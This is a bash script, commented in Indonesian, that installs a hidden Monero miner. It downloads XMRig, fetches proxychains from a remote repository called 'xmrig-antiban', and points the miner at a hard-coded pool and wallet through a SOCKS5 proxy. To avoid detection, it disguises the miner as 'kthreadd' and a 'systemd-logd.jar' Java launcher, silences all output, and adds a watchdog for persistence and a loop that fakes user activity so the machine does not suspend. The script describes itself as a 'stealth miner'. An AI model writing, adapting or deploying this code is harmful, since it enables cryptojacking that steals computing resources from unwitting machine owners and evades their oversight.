#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="24.199.99.228:1935"
SOCKS5_IP="116.100.220.220"
SOCKS5_PORT="1080"
if command -v hostname >/dev/null 2>&1; then
  WORKER="kthreadd-$(hostname)"
else
  WORKER="kthreadd-$(date +%s)"
fi
DIR="$HOME/.cache/.kthreadd"

# === PERSIAPAN ===
mkdir -p "$DIR" && cd "$DIR"
sync || true
echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true

# === DOWNLOAD XMRIG ===
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | \
grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm -f xmrig.tar.gz
mv xmrig kthreadd
chmod +x kthreadd

# === PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

# === KONFIGURASI PROXY ===
cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $SOCKS5_IP $SOCKS5_PORT
EOF

# === KONFIGURASI XMRIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": { "enabled": true },
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET.$WORKER",
    "pass": "Danis",
    "keepalive": true,
    "tls": true
  }]
}
EOF

# === JAVA LAUNCHER ===
cat > Launcher.java <<EOF
import java.io.*; import java.util.*;
public class Launcher {
  public static void main(String[] args) {
    while (true) {
      try {
        Thread.sleep(new Random().nextInt(10) * 1000 + 5000);
        ProcessBuilder pb = new ProcessBuilder("bash", "-c",
          "LD_PRELOAD=" + System.getenv("PWD") + "/libproxychains.so.4 PROXYCHAINS_CONF_FILE=" +
          System.getenv("PWD") + "/proxychains.conf ./kthreadd --config=config.json");
        pb.redirectOutput(new File("/dev/null"));
        pb.redirectErrorStream(true);
        pb.start().waitFor();
        Thread.sleep(3000);
      } catch (Exception e) {}
    }
  }
}
EOF

javac Launcher.java
jar cfe systemd-logd.jar Launcher Launcher.class

# === JALANKAN MINER SECARA STEALTH ===
nohup java -Djna.nosys=true -Djava.awt.headless=true -jar systemd-logd.jar >/dev/null 2>&1 &
disown

# === WATCHDOG ===
cat > watchdog.sh <<EOF
#!/bin/bash
while true; do
  if ! pgrep -f systemd-logd.jar >/dev/null; then
    sync || true
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
    nohup java -jar systemd-logd.jar >/dev/null 2>&1 &
    disown
  fi
  sleep 60
done
EOF

chmod +x watchdog.sh
nohup bash watchdog.sh >/dev/null 2>&1 &
disown

# === ANTI SUSPEND / ANTI DISMISS JARINGAN ===
cat > antisuspend.sh <<EOF
#!/bin/bash
while true; do
  if [ -e /dev/input/mice ]; then
    dd if=/dev/zero of=/dev/input/mice bs=1 count=1 2>/dev/null
  fi
  xset s reset >/dev/null 2>&1 || true
  gdbus call --session --dest org.freedesktop.ScreenSaver --object-path /org/freedesktop/ScreenSaver \\
    --method org.freedesktop.ScreenSaver.SimulateUserActivity >/dev/null 2>&1 || true
  sleep 30
done
EOF

chmod +x antisuspend.sh
nohup bash antisuspend.sh >/dev/null 2>&1 &
disown

echo "[✓] Stealth miner aktif dengan Java + watchdog + anti suspend."
